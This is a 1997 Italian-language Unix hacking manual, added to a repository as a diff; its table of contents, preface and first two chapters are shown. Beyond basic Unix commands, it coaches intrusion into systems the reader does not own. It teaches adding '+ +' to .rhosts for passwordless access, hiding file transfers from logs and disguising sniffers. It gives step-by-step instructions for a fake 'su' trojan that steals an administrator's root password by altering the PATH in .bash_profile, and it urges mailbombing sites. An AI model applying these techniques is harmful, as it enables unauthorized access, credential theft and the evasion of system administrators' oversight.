@@ -1,0 +1,5359 @@
+                       L A  I H S  P R E S E N T A  
+    L A  G R A N D E  G U I D A  A L L ' H A C K I N G  D I  U N I X
+	             
+                       Versione 1.0b di Novembre '97
+
+Scritto e tradotto da Lord KasKo & Turbo Snail di Italian Hacking Service
+
+!!!!!ATTENZIONE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+La IHS non e' responsabile di danni prodotti a persone o cose causate 
+dell'applicazione delle informazioni contenute nella guida. La guida e' al solo 
+scopo informativo.
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+INTRODUZIONE DELLA IHS
+----------------------
+Ciao Ragazzi e benvenuti nel fantastico mondo dell'hacking. Mancavano proprio 
+delle guide in italiano, vero? Ebbene, noi della IHS abbiamo voluto scrivere 
+questo manuale in modo da far avvicinare le persone a questo mondo. Questa guida 
+e' un insieme di conoscenze personali, di altri testi e di quant'altro. Speriamo 
+di aver fatto un buon lavoro e se avete qualche commento scriveteci a 
+lordkasko@freeweb.essenet.it
+
+Vogliamo ringraziare Invisible-Evil per la sua bellissima guida da qui abbiamo 
+tratto spunto, a noi per essere hacker e a tutti quelli che ci appoggiano, come 
+Jader del sito Zona d'Ombra (http://www.abnet.it/zo/index.htm), ed altri hacker 
+come InfectedMachine e tutti quelli di SystemDown, gli unici italiani che hanno 
+avuto le palle di venir fuori facendo un'ottima rivista. Forza ragazzi !!!!!!
+
+FUCK! a tutti quelli che utilizzano le loro capacita' informatiche per creare 
+casino nella nostra comunita', quelli che distruggono siti per il piacere di 
+farlo.
+FUCK! a chi utilizza internet per intraprendere traffici di bambini e chi 
+sostiene i pedofili!!! Invitiamo, come hanno fatto i colleghi di SD, a 
+distruggere con mailbomb siti pedofili oppure avvisare le autorita'.....
+
+Infine salutiamo te e ti auguriamo una buona lettura......
+
+Nota :
+QUESTO DOCUMENTO CONTIENE DEL CODICE IN C - FATE IN MODO DI NON SALVARE NESSUNA 
+MODIFICA.
+
+Se avete altri Exploits,bugs, sniffers o utility che non sono presenti in questo 
+testo,per favore inviate una E-Mail a : lordkasko@freeweb.essenet.it
+
+In questo modo potremo mantenervi costantemente aggiornati sulle ultime versioni 
+di questo toolkit!
+
+------------------------------------------------------------------------------
+
+Elenco dei contenuti:
+
+Avviso
+
+Prefazione
+
+Capitolo I - I comandi Unix da conoscere assolutamente.
+
+1A. Comandi basilari
+    Come ritornare alla propria Home directory
+    Come raggiungere facilmente la Home directory di un utente
+    Come vedere in quale directory ci si trova
+    Come ottenere un manuale completo di ogni comando
+1B. Telnet
+    Permessi dei file Unix
+    Gruppi Unix
+    Come cambiare permessi e gruppi
+1C. Rlogin
+    .rhosts
+    Come preparare un file .rhost per fare login senza password
+1D. FTP
+    Collegarsi al sito,ma mai al di fuori di esso.
+    Uso di prompt, hash e bin
+    Uso di get, put, mget e mput
+1E. GCC (compilatore unix)
+    Come inserire un file in un sistema senza doverlo uploadare
+    Come copiare dei file nella propria Home directory in modo semplice
+    Come compilare dei programmi in C
+    Come rinominare a piacere i programmi in C
+    Come caricare dei programmi in background mentre ci si sta scollegando
+    Controllare i processi usando ps
+
+Capitolo II - Come iniziare (il vostro primo account)
+
+2A.  Come crackare i file delle password
+     Come ottenere centinaia di account col vostro primo 'hacked account'
+     Perche'avete davvero bisogno di una password crackata in un sistema
+     Come ottenere la paasword di root in un sistema non espugnabile
+     Usare un falso programma SU
+     Documentazione sul falso programma su
+     Come ottenere la password del Sysadm
+     Come leggere .bash_history
+     Cracker jack - un buon password cracker
+     Come usare Cracker jack
+     File vocabolario
+     Cosa serve per iniziare
+     Modificare il file vocabolario
+     Hash file da usare con Cracker Jack e il vostro file vocabolario
+     Hash file da usare con Cracker jack e il vostro file di Password
+ 
+2B. Parlando con dei Novellini
+    Come trovare i novellini
+    Come ottenere le loro password
+
+2C. La strada piu' complicata.
+    Usare finger @
+    Dove potrebbe essere la password?
+    Ottenere maggiori informazioni da finger.
+    Un piccolo file .c da usare se avete fatto progressi.
+    Scrivere un piccolo Script in Perl che fa il lavoro al vostro posto.
+    Come ottenere una domain list di tutti i domini da rs.internic.net
+    Uno Script in Perl per scomporre i domini e porli in ordine in una lista 
+    leggibile
+    Come eseguire lo script in Perl
+
+ 2D. Usare mount per ottenere l'accesso ai sistemi Unix
+     Cos'e'nfs mount
+     Di cosa si necessita per iniziare
+     Come verificare che in un sistema si possa fare il mount dei drive
+     Uno script per cercare sistemi sui quali sia possibile fare nfs mount
+     Come fare il mount del sistema
+     Come fare l'unmount del sistema
+     Una dimostrazione dal vero
+     Mounting del drive
+     Vedere le directory dell'utente
+     Editare il Password file della macchina locale
+     Come mettere un file .rhosts nelle directory degli utenti
+     Come fare rlogin negli account degli utenti
+
+Capitolo III - Come ottenere il file delle Password.
+
+3A. PHF
+    Cos'e'il phf
+    Usare lynx o Netscape per accedere al phf
+    Trovare lo user id tramite WWW
+    Come vedere se si e'root tramite phf
+    Come trovare il file delle password con phf
+    Fare una copia di backup del password file delle vittime
+    Cambiare la password di un utente con phf
+    Ripristinare le vecchie password.
+    Un file .c per inviare comandi al phf dalla vostra shell
+    Come usare il file di shell di phf
+    Un altro modo di usare il phf - Testo di Quantum
+    BindWarez file by Quantum
+    Uno script perl che prova OGNI domain su Internet e fa il log degli accessi
+    di root e recupera i password file per voi tutto il giorno rimanendo in 
+    background.
+    Documentazione per lo script appena citato
+    Ottenere degli account da /var/?/messages
+    Uno script per ottenere le password se si ha accesso a /var/?/messages
+
+3B. Novellini
+
+3C. Ottenere i file shadow passwd 
+    Cos'e'una shadow passwd
+    Ottenere il file shadow senza l'account di root
+    Un file .c per recuperare qualunque file senza l'account di root
+
+3D. Raggiungere /etc/hosts
+    per quale motivo andare in /etc/hosts
+
+Capitolo IV - Guadagnare l'account di Root
+   
+Cosa fare se non si riesce ad ottenere l'accesso di root nel sistema
+
+4A. Bugs
+    Introduzione
+4B. Exploits
+    L'exploit tramite mount/unmount
+    Cosa sono i SUID perm's
+    Il file .c per l'unmount
+    Come compilare unomunt.c
+    Exploit di Linux tramite lpr 
+    File .c per l'exploit di Linux tramite lpr
+    Il file .c per l'exploit con lpr (versione per BSD)
+    Come usare lpr
+    Guardare i proprietari del gruppo con lpr
+    Usate lpr per la prima root,poi fate una SUID shell
+    Come ottenere una SUID root shell per futuri accessi di root (root root)
+    L'Exploit con splitvt
+    Programma .c per l'exploit con splitvt
+    Come usare il programma splitvt per l'exploit
+    Lo script di shell per l'exploit di root con Sendmail 8.73 - 8.83
+    Come usare l'exploit con sendmail per ottenere root access
+
+Capitolo V - Renditi invisibile
+
+Mantenere l'accesso
+5A. Zap2 (per wtmp/lastlog/utmp)
+    Fare finger all'host prima di login
+    Fare login e stare al sicuro
+    Come configurare Zap2 
+    Trovare la locazione del log file
+    Il programma zap.c
+5B. Altri script
+    l'editor wted per wtmp
+    Come fare chmod al file wtmp.tmp
+    Come copiare il file wtmp.tmp in wtmp
+    Settare il path per il file wtmp in wted
+    il file wted.c
+    Pulire il lastlog con lled
+    Riga di comando per lled
+    Come usare lled
+    Come fare chmod al file lastlog.tmp 
+    Come copiare il file lastlog.tmp in lastlog
+    Settare il path per il file lastlog in lled
+    Il file lled.c
+    Un buon script perl per editare i file wtmp,utmp e controllare i processi
+
+Capitolo VI - Eliminare i log file
+
+6A. Un giro in un sistema hackato 
+    Logghiamoci nel sistema
+    Cerchiamo l'admin
+    Directory nidificate
+    Preparare il file di Root
+    Diventare invisibili
+    Fare il grep della directory dei log
+    Sniffare la rete
+    Editare il file linsniffer.c
+    Dare un'occhiata ai processi che girano
+    Compilare e chiamare il programma di sniffing
+    Iniziare una sessione di sniff
+    Cambiare gli accessi ai file del gruppo
+    Realizzare un trojan suid root shell per avere uid=0 gid=0 ogni volta
+    Chiamare il Trojan
+    Modificare la data dei file
+    Controllare il log file dello sniffer
+    Svuotare il contenuto degli history files 
+    Usare unset per gli history files.
+6B. Messaggi e syslog
+    Come trovare i logs usando /etc/syslog.conf
+    Come vedere se ci sono logs nelle directory nascoste 
+    Come vedere se i logs vengono postati agli account degli utenti
+    Come vedere se i logs stanno andando su di un'altra macchina
+    Come editare syslog.conf per nascondere i login
+    Riavviare syslogd
+    Come vedere se c'e'un log segreto di su leggendo /etc/login.defs
+6C. xferlog.
+    Come editare xferlog
+    Come greppare ed editare i logs www
+    Come cercare i logs ftp
+    Altri modi per editare i testi dei log
+    Usare grep -v
+    Uno script per ricavare linee di testo da questi log
+    Riavviare syslogd
+6D. I crontabs
+    Come trovare e leggere i crontabs di root o dell'admin
+    Come vedere se MD5 e settato sulla macchina
+    Cos'e'MD5
+
+Capitolo VII - Mantenere l'accesso alla macchina
+7A. Trucchi e segreti
+    Quando vieni beccato dall'admin
+    Cosa aspettarsi dall'admin
+    History files
+    Directory nidificate
+    Inserire dei Trojan
+    Directory nascoste
+    Creare nuovi comandi (trojans)
+    Aggiungere o cambiare delle parti del passwd file
+    Modificare alcuni admin account con password nulla 
+    Il miglior modo di aggiungere un account
+    Editare un account vuoto in modo da potersi loggare
+    Installare alcuni giochi o programmi exploitable
+    Come conoscere il tuo admin
+    Leggere la mail di sistema (senza aggiornare i puntatori)
+    Cosa cercare nella directory della mail
+    Un programma per leggere la posta senza aggiornare i puntatori
+7B. Backdoors
+7C. Root Kits e trojan
+    Cosa sono i Root kit
+    Cosa sono i Demon kit
+    Cosa fanno i trojan
+
+
+*********************************************************
+* Appendice I - Cosa fare dopo un accesso                *
+*********************************************************
+  La Check list dalla a alla z
+
+****************************************************
+* Appendice II - Siti Hacking / Security WWW / ftp *
+****************************************************
+
+
+*********************************************************
+* Appendice III - FILES UUENCODATI                      *
+*********************************************************
+
+1. Quantum's Bindwarez -File binari per PHF
+2. Demon Root Kit - Include: Banish, DemonPing, DemonSu, DemonTelnet
+3. Linux Root Kit - Include: Login, Netstat, and, PS
+4. Programma Fake SU 
+
+
+**********
+Avviso!!!
+**********
+
+E' vero, questo manuale aiutera' gli hackers ad entrare nei sistemi ma e' da 
+considerarsi anche come una guida per i Sysadm per affrontare i problemi 
+riguardanti la sicurezza e per conoscere quali siano gli elementi da 
+controllare in modo da tenere fuori gli hacker. 
+
+Se usi questo manuale per guadagnare l'accesso ad un qualunque sistema al quale 
+non appartieni e danneggi una sua qualsiasi parte sei punibile a norma di legge.
+
+Non sto dicendo di entrare nei sistemi, sto soltanto dicendo qualcosa della mia 
+esperienza e delle cose che farei se entrassi dentro al mio stesso sistema.
+
+Questa e' solo una informazione ....
+
+**********
+Prefazione
+**********
+
+Ok, cominciamo. Se hai intenzione di fare dell'hacking, devi farlo per una 
+ragione. Tutti gli hackers hanno una ragione per farlo. La maggior parte ha solo 
+sete di sapere. La maggior parte di cio' che so l'ho imparata in qualche service 
+provider o sulla macchina di qualcun altro.
+Sono uno che punta molto sull'esperienza personale.
+Se avessi dovuto studiare cio' che so, avrei dovuto leggere 20000 libri solo per 
+sapere qualcosa su alcuni file di configurazione, sui messaggi email degli 
+amministratori, sui file .bash_history e qualcos'altro su alcuni altri sistemi.
+
+Qui in questo manuale dovresti imparare come essere un "hacker completo" e 
+sviluppare un tuo stile. Non ci vorra' molto ma ci vorra' un po' di esperienza 
+prima di poterti considerare davvero un hacker.
+
+Non basta sapere crackare un file di password ed entrare in una macchina unix 
+per considerarti un hacker. 
+Ok, sai come ottenere l'accesso di root in un sistema! Non sei ancora un hacker! 
+Prima devi sapere perche' sei un hacker e poi avere un tuo stile e una tua 
+filosofia. Ci vuole uno scopo ed una ragione per entrare in qualunque sistema. 
+Il vero hacker sa perche' sta facendo qualcosa, e lo fa per ragioni come il 
+sapere, l'informazione, e l'ACCESSO. Il vero hacker trasformera' un hack in 
+accessi a molti diversi sistemi e provider e manterra' questi accessi per 
+conoscenze future e per maggiori informazioni. 
+
+Gli hacker da quattro soldi non saranno invisibili e faranno molte sciocchezze 
+come: cancellare e corrompere dati, fare cadere le macchine, lanciare dei bot o 
+dei client IRC dagli account di root o dare a tutti le password che ha crackato 
+per far sapere a tutti che sa fare dell'hacking. O potrebbere fare sciocchezze 
+che lo portera' ad essere beccato. Penso che talvolta questo venga fatto di 
+proposito per attirare su di se' l'attenzione in modo da essere beccato ed 
+annunciare che sono hacker, e che c'era anche lui! 
+Un vero Hacker non cerca questo tipo di gloria, vuole l'accesso e vuole 
+mantenerlo ed essere invisibile! Non dira' a molti amici riguardo il sistema, 
+non dara' in giro le password o gli account e terra' gli altri 
+fuori in modo da mantenere l'accesso e tenerlo il piu' possibile pulito.
+ 
+Qui in questo manuale spero di aver messo abbastanza stile in modo che tu possa 
+davvero interessarti a quest'opera e diventare cosi' un vero buon hacker!
+
+HAPPY HACKING!!!
+
+--------------------------
+Capitolo I
+Comandi unix da conoscere.
+--------------------------
+
+Ci sono solo pochi comandi basilari da imparare, e poi anche alcuni programmi 
+unix che ti aiuteranno a collegarti, a penetrare nel sistema o a mantenere 
+l'accesso ad una macchina.
+
+Chiama il tuo Internet Provider locale e chiedi loro uno shell account in modo 
+da poter imparare e fare della pratica su questi comandi base. Un normale 
+account di shell non e' in genere caro.
+
+
+----------------
+Sezione 1A
+Comandi basilari
+----------------
+
+Spero tu abbia una conoscenza di base del DOS, che ti aiutera' un po' e partiro' 
+da questo presupposto durante la stesura di questo manuale.
+A sinistra ci sono i comandi DOS, a destra i corrispettivi comandi UNIX:
+
+RICORDA: Unix e'case-sensitive, cosi' se qui si usa il minuscolo devi farlo 
+anche tu; se io uso lo spazio lo devi fare anche tu. Dos ti lascera' passare 
+tante di queste cose: unix NO!
+
+DIR/W      = ls
+DIR        = ls -l
+DIR/AH     = ls -al  AH=(hidden) -al=(include anche i file nascosti)
+RENAME     = mv
+ATTRIB     = chmod
+MD         = mkdir
+RD         = rmdir
+DEL        = rm
+COPY       = cp
+
+Questi sono i comandi di base, ti suggerisco di guardare il manuale di ciascuno 
+di questi comandi direttamente dalla shell unix. Lo puoi fare digitando:  
+man comando 
+Ciascuno di questi comandi ha dgli switch, come cp -R per copiare file e 
+directory. Cosi' dovresti scrivere: 
+man cp per vedere tutti gli switch che puoi usare con il comando di copia.
+
+cd (poi premi INVIO) ti portera' sempre alla tua home directory
+cp nomefile $HOME copiera' il file nella direcory home.
+cd ~nomeutente ti portera' nella Home directory di quell'utente, sempre che tu    
+   vi abbia accesso
+pwd (premi INVIO) ti dira' in quale directory ti trovi
+
+-------------
+Sezione 1B
+Telnet
+-------------  
+
+Telnet e'un comando che puoi usare da un account di shell, o da un file exe 
+(telnet.exe) da Windows, OS/2 e Windows 95 e altri OS che permettono di 
+collegarsi ad altre macchine sulla rete. Ci sono altri programmi che 
+conoscerai qui, come FTP e rlogin che puoi usare ma ora useremo telnet.
+
+Puoi usare telnet se conosci l'indirizzo IP o il nome dell'host al quale vuoi 
+collegarti. Per usare il comando ti serve solo il programma telnet per 
+collegarti all'IP o all'host in questo modo:
+
+Telnet netcom.com  oppure  telnet 206.146.43.56
+
+OK, e ora il login:
+
+telnet machine.com
+
+trying .....
+
+Connected to machine.com
+
+Linux 2.0.28 (machine.com) (ttyp0)
+
+machine login:username
+password:#######
+
+bash$
+
+Il tuo prompt potrebbe apparire differente, ma noi useremo questo.
+
+Nota qui sopra che ti verra' detto quale OS gira sulla macchina a cui ti sei 
+collegato.
+Puoi usare questo se raccogli una vasta collezione di passwd file. Prima di 
+iniziare a crackarli, ordinali per tipo di O/S facendo soltanto il telnet in 
+modo da sapere che sistema usano.
+Ci sono altri modi, ma manteniamo questo argomento ancora per un attimo,telnet 
+domain.name.com ,dopo aver visto cosa gira su di una macchina prendi nota e 
+premi CTRL J per chiudere la connessione.
+
+Metti insieme tutti i tuoi file di passwd in un solo pile che dovrai crackare 
+per primo.. Tutto cio' che serve e' un account che funziona per quel sistema, e 
+saremo quasi certi che otterremo i permessi di root su quella macchina! Ci sono 
+talmente tanti buchi in linux da pensare di non poter penetrare in una di quelle 
+macchine!
+OK, ora possiamo entrare nel meraviglioso mondo dell'hacking
+
+----------------------
+Permessi dei file Unix
+----------------------
+
+bash$
+
+bash$ cd /tmp
+bash$ ls -l
+total 783
+-rwx------   1 wood     users           1 Jan 25 18:28 19067haa
+-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
+-rw-------   1 rhey19   root       395447 Jan 24 02:59 pop3a13598
+-rw-------   1 rhey19   root       395447 Jan 24 03:00 pop3a13600
+drwxr-xr-x   4 root     root         1024 Jan 12 13:18 screens
+
+Prima cosa: dobbiamo usare lo slash ( / ) al posto del back-slash ( \ ) per 
+accedere alla directory tmp! Unix usa / per la root directory, al contrario del 
+DOS che usa appunto il simbolo \
+Nota che abbiamo usato ls -l per la directory nel formato "a tutta pagina". Se 
+avessimo usato 'ls' avremmo ottenuto cio' che c'e'qui sotto.
+
+bash$ ls
+19067haa      filter.14428  pop3a13598    pop3a13600    screens
+
+Con quello che vediamo qui non possiamo dire molto, cosi' perlopiu' useremo ls -
+al con -al vedremo anche i file hidden, le directory e i file nascosti 
+inizieranno sempre con '.'. Ora guarda:
+
+bash$ ls -al
+total 794
+drwxrwxrwt   4 root     root         8192 Jan 25 23:05 .
+drwxr-xr-x  22 root     root         1024 Dec 28 18:07 ..
+-rw-r--r--   1 berry    users           6 Jan 25 23:05 .pinetemp.000
+drwxr-xr-x   2 berry    users        1024 Jan 25 23:05 .test
+-rwx------   1 wood     users           1 Jan 25 18:28 19067haa
+-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
+-rw-------   1 rhey19   root       395447 Jan 24 02:59 pop3a13598
+-rw-------   1 rhey19   root       395447 Jan 24 03:00 pop3a13600
+drwxr-xr-x   4 root     root         1024 Jan 12 13:18 screens
+
+.pinetemp.000 e'un hidden file, and .test e'una directory hidden.
+
+-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
+
+riga 1       riga2     riga3
+----------------------------
+
+Ora abbiamo bisogno di imparare qualcosa sui permessi, sugli utenti e sui 
+gruppi.
+
+La riga #1 indica i permessi del file
+La riga #2 indica chi e'il proprietario del file
+La riga #3 indica il gruppo di appartenenza del file
+
+I permessi dei file sono raggruppati in 3 gruppi diversi.
+Se la linea comincia con una d, e'una directory, se non c'e'la d, e'un file.
+
+- --- --- ---
+| |   |   |--------> Other = Chiunque accede alla macchina
+| |   |------------> Group = alcuni gruppi possono accedere
+| |----------------> User  = Solo il proprietario puo' accedere
+|------------------> Marcatore della Directory 
+
+- rw- r-- r--
+| |   |   |--------> 'Other' puo' solo leggere i file
+| |   |------------> 'Group' puo' solo leggere il file 
+| |----------------> 'User' puo' scrivere il file
+|------------------> Non e' una directory
+
+
+- rwx rwx r-x
+| |   |   |--------> 'Other' puo' leggere ed eseguire il file
+| |   |------------> 'Group' puo' leggere ed eseguire il file
+| |----------------> 'User'  puo' scrivere ed eseguire il file
+|------------------> Non e' una directory
+
+Il proprietario e' l' 'user name' nella riga #2 e il group name e'il nome nella 
+riga #3. Nel DOS i file hanno l'estensione .exe, .com, o .bat per gli 
+eseguibili, ma in unix basta la --x nel tuo gruppo 'user', 'other' e 
+'group'
+
+Puoi cambiare questi permessi se sei il proprietario del file o se sei ROOT:
+
+---------------------------------------------------------------------------
+chmod oug+r filename dara' accesso in lettura del file a tutti e tre i gruppi
+
+chmod og-r filename rendera' il file leggibilie solo dall'utente che possiede il 
+file. (nota che - o + settano il valore di verita' del parametro del file).
+
+chmod +x filename rendera' il file eseguibile da tutti.
+
+chown username filename rendera' il file di proprieta' di un altro utente
+chgrp groupname filename rendera' il file di proprieta' di un altro gruppo
+---------------------------------------------------------------------------
+
+Stai attento a non cambiare i permessi dei file o ti butteranno fuori dal 
+sistema. Cambiare le configurazioni del sistema potrebbe solo far saltare altre 
+funzioni, cosi' tieni lontane le zampe se non vuoi farti beccare! 
+Fai solo cio' di cui sei *SICURO*. Usa solo comandi che conosci, potresti 
+ritrovarti a  trascorrere ore a fare un fix di questo tipo:
+
+chown -R username /* Potrebbe tenerti impegnato per un anno! :)
+
+Ti basta stare attento!
+
+Approfondiremo le conoscenze di questo stuff quando sevira'.
+
+------------------
+Sezione 1C 
+Rlogin
+------------------
+
+C'e' un altro comando che puoi usare e che approfondiremo altrove quando diremo 
+come usare rlogin per loggarsi ad un sistema senza una password.
+
+Per ora leggi il manuale di rlogin usando man rlogin dalla tua shell.
+
+Il comando base sara':
+
+rlogin -l username hostname
+connecting....
+password:
+
+bash$
+
+Rlogin necessita che l'utente abbia un file nella home che dica da quale sistema 
+si puo' fare rlogin. Questo file .rhosts dovrebbe apparire cosi':
+
+username hostname (or) hostname
+
+Se aggiungi  + + a questo file, lascera' entrare chiunque da qualunque host 
+senza password.
+
+Questo file dovrebbe apparire cosi':
+
+----- cut here ------
++ +
+_____ cut here ------ 
+
+Se ci sono gia' delle entry potresti aggiungere + + sotto i loro host names, ma 
+ricorda che ora noteranno che possono entrare con rlogin senza password. 
+Dovresti prendere di mira persone che non hanno ancora un file .rhosts
+
+---------------
+Sezione  1D 
+FTP
+---------------
+
+Un altro modo di fare login e'con FTP. Puoi usare un client windows, o anche 
+fare login da una shell.
+
+ftp ftp.domain.com
+
+Questo ti permettera' di fare upload e download dal sito su cui fai hack.
+Ricordati di editare il xferlog (vedi la sezione 6d) per coprire le tue tracce 
+nel sistema. RICORDA! Non devi MAI fare ftp o telnet fuori dal sistema in cui 
+sei penetrato, lavora solo all'interno! Se provieni dal tuo stesso sistema, o da 
+un altro account hacked forse stai dando la tua login e la tua password al 
+sysadm o ad un altro hacker su quel sistema. Ci potrebbe essere un trojan 
+telnetd o ftpd caricato nel sistema, o anche uno sniffer, Ora potresti aver dato 
+a qualcuno la tua login e password. E se quel qualcuno e'il sysdam, potrebbe 
+pensare che la vendetta e'dolce ;)
+
+Usando ftp da shell, ti suggerisco alcuni comandi:
+
+Dopo esserti loggato, scrivi al prompt i seguenti comandi premendo enter dopo 
+ciascuno di essi.
+
+prompt
+hash
+bin
+
+prompt permettera' di usare comandi del tipo (mget *) o (mput *) e trasferire 
+l'intera directory senza che ti venga chiesta la conferma per ciascun file.
+                hash marks
+hash mostrera' ########### sullo schermo cosicche' si possa vedere la velocita' 
+del trasferimento.
+
+bin ti garantira' di ricevere i file nel modo giusto, e se si sta trasferendo un 
+file binario potra' essere decompresso.
+
+I comandi di trasferimento sono semplici, get filename, o , put filename, o per 
+molti file puoi usare wild cards con mput e mget.
+
+--------------------
+Sezione 1E
+Compilatore GCC
+--------------------
+
+Ci sara' un momento in cui avrai bisogno di compilare un file .c
+
+E' meglio compilarlo sulla macchina in cui stai lavorando. Cosi' fai l'upload o 
+usa 'Copia e Incolla' sull'hacked box e compila li' il sorgente. Sei hai 
+problemi con il loro compilatore prova a fare l'upload del file precompilato.
+
+Un modo di inviare il file sulla macchina vittima dovrebbe essere quello di 
+usare 'copy & paste'. Trova un buon tsr o uno shareware per windows per fare 
+cio' se adesso non hai nessun modo per farlo. Puoi copiare lo script da una 
+finestra all'altra dentro ad un editor della macchina vittima e in questo modo 
+non ci sara' nessun log del download di file ascii.
+
+Per copiare e incollare puoi provare ad aprire un editor sull'hacked box e 
+copiare dall'altra sessione, e poi incollare lo script nell'editor e salvare il 
+file. In questo modo non ci sara' ancora nulla nello xferlog.
+
+Puoi fare la stessa cosa col file di password. Se decidi di scaricare il file 
+delle password con ftp, ricorda di copiarlo nella tua Home con un nome diverso.
+
+bash:/etc:> cp passwd $HOME/plog  copiera' il file chiamato passwd dalla 
+directory /etc in cui ti trovi alla tua Home in un file chiamato plog invece di 
+passwd.
+I SySaDm greppano i xferlogs alla ricerca di chi sta scaricando il file delle 
+password.
+
+Un altro modo di inviare/ricevere file all'/dall' hacked box senza comparire nei 
+logs e'di aprire una sessione IRC sulla macchina vittima, poi dall'altra 
+sessione nella quale sei gia' un utente su IRC, inviare un file usando DCC.
+
+Il comando per inviare i file e'/dcc send <nick> <file>
+
+Sarebbe comodo se tu avessi un bot caricato su IRC quando stai facendo 
+dell'hacking cosi potresti inviare i file al bot e lasciare che li riceva 
+automanticamente.
+
+Un 'bot' e'un programma robot che puoi caricare in background nello shell 
+account e si occupera' di ricevere file,tenere i canali aperti,etc...
+
+Il Compilatore GCC e'semplice...
+
+gcc filename.c -o nomechevuoi
+
+Se stessi per compilare un programma chiamato z2.c che cancella i file log
+scriverei questo: 
+
+gcc z2.c -o zap
+
+Otterrei un file eseguibile chiamato zap
+
+Se scrivi solo gcc z2.c otterrai un file chiamato a.out, questo e'l'eseguibile e 
+si puo' rinominare ad esempio come Zap col comando
+
+mv a.out Zap
+
+Ora ci sara' un file chiamato Zap che sara' eseguibile invece di a.out.
+
+Vorrai essere sicuro di non chiamare un file con un nome identificabile dal 
+SYSadm: se hai uno sniffer chiamato linuxsniffer.c, in fase di compilazione, 
+sarebbe meglio cambiare il nome. Ad esempio:
+
+gcc linuxsniffer.c -o lsn
+
+Ricorda anche che a volte per eseguire questi file direttamente nella directory 
+dovrai scrivere soltanto il nome del file seguito da <Enter>.
+A volte potrebbe non funzionare a meno che tu preceda con  ./ il nome 
+dell'eseguibile, cioe'lsn diverrebbe 
+
+./lsn
+
+A volte avrai bisogno di far girare in background un programma anche dopo il 
+logoff, come nel caso appena citato dello sniffer. In questo caso potresti voler 
+chiamare lo sniffer con un nome difficilmente identificabile. 
+Fallo secondo il tuo stile. MA per farlo rimanere in background mentre non siamo 
+loggati devi lanciare il comando seguito da &
+
+lsn&
+
+Se digiti solo lsn, lo schermo si blocchera' e non potrai scrivere mentre fai lo 
+sniffing ma se scrivi lsn& lo sniffer verra' caricato e avrai di nuovo il 
+prompt.
+Il sistema ti fara' sapere che e'stato caricato dandoti il # del process id 
+assegnato al programma.
+
+Puoi vedere i processi con il comando ps -x ,potresti voler lanciare  
+ps -auxe |more
+
+a= all
+u= show user
+x= yours
+e= env
+
+Su alcune macchine
+f=tree
+o il comando: pstree
+
+------------------------------------
+Capitolo II
+Iniziamo! (il tuo primo account)
+------------------------------------
+
+Ci sono molti modi per ottenere un account per iniziare. Trattero' ciascun 
+argomento per aiutarti a iniziare. 
+Tutto cio' che ti serve e' un buon account da cui tirarne fuori a centinaia. 
+Pensaci; Potenzialmente ogni macchina linux e' un buon sistema espugnabile. ;)
+
+Ora hai un accesso di root e carichi uno sniffer. Lo sniffer TCP cerchera' i 
+processi di login alla rete e fara' il log della login e della password per ogni 
+telnet, ftp, o connessione dial-in che viene fatta verso l'esterno o verso 
+l'interno del sistema.
+
+Anche se e'una piccola connessione ethernet, ci sono in giro un centinaio di 
+password per poche macchine o domini. Se e'un net provider piu' ampio otterrai 
+centinaia di account in tutto il mondo. Tutto cio' che ti serve e'un buon accout 
+e una password per un sistema da espugnare.  Se sembra che non si possa fare 
+l'exploit alla root, potrebbe essere un buon sistema in cui crackare le password 
+e scambiare gli account per altri account con hackers o utenti di IRC che stanno 
+cercando di caricare un bot ma che non hanno un account di shell o spazio su 
+disco per farlo.
+MAI scambiare anche una sola password di un sistema del quale hai ottenuto 
+accesso di root. Tieniti questi sistemi per te!
+
+Ora vediamo come fare per ottenere il tuo primo account.
+
+------------------------------
+Section 2A.
+Cracking sul phile di passwd
+-----------------------------
+
+Perche'continuare a crackare passowrd per un sistema del quale puoi ottenere 
+comunque la maggior parte delle password in 24 ore? Non solo per qull'hacked box 
+ma per tutte le altre macchine a cui e'collegato. Se il sistema non e' espugnabile, 
+non sprecarci tempo, vai sul prossimo! Piu' avanti potrai scambiare le password 
+che hai crackato.
+
+Se ottieni un account di administrator crackato potresti voler leggere i suoi  
+history-files e vedere se di solito usa il comando su per accedere molto a root. 
+Se e'cosi' puoi usare un Trojan su di lui. Questo scoprira' per te la password 
+di root.
+Funziona cosi': cambi il suo script di shell in modo che ci sia una directory 
+nascosta (.term) va bene,che sia settata nel path prima di tutte le altre. Metti 
+un fake-su in .term (o un altra directory). L'Admin digita 'su', tutto sembra 
+funzionare, digita la password di root la password e'copiata in un log file in 
+/tmp/.elm69, e il trojan su si cancella e riporta un errore di password dicendo 
+di provare ancora. L'admin pensa di aver sbagliato qualcosa e lancia di nuovo 
+su, ma ora tutto e' ok e riesce a loggarsi.
+
+Troverai il fake su  nell'ultima appendice chiamata 'file uuencodati'.
+
+Fake Su by Nfin8 - i-e
+
+IRC: /msg i-e
+
+1,2,3...ecco fatto!
+
+1. Cambia il path in uno degli user account nei quali hai verificato tramite gli 
+history-file che il proprietario usa SU,inserisci in testa al path la directory 
+dove il trojan  SU file si trova. .term o .elm andranno bene!
+
+2. Assicurati di editare l'inizio del file su.c per mettere il path dove il file 
+si trovera' una volta compilato,in modo da potersi auto-cancellare e lasciar 
+posto al vero SU per il secondo tentativo.
+
+3. Metti tutti i file nella directory target e compila su.c 
+
+gcc su.c -o su
+
+Ora cancella tutti i file eccetto su. Fatto!
+
+.bash_profile divrebbe assomigliare a questo:
+
+# .bash_profile
+
+# Get the aliases and functions
+if [ -f ~/.bashrc ]; then
+        . ~/.bashrc
+                fi
+
+# User specific environment and startup programs
+
+PATH=$PATH:$HOME/bin
+ENV=$HOME/.bashrc
+USERNAME=""
+
+export USERNAME ENV PATH
+
+Cambia la prima riga in: PATH=$HOME/.term:$PATH:$HOME/bin
+
+Quando il sysadm lancia 'SU' lancera' il trojan nella directory .term e 
+riportera' il messaggio che la password digitata e'errata, il Trojan SU avra' 
+messo un file hidden nella directory  /tmp per te che contiene la password di 
+root (o la password dell'account)  che e'stata digitata. Se e'un account 
+piuttosto che root potrai sapere il nome dell'account. Poi il trojan su si 
+cancellera' in modo che la volta successiva si avviera' il vero SU .
+
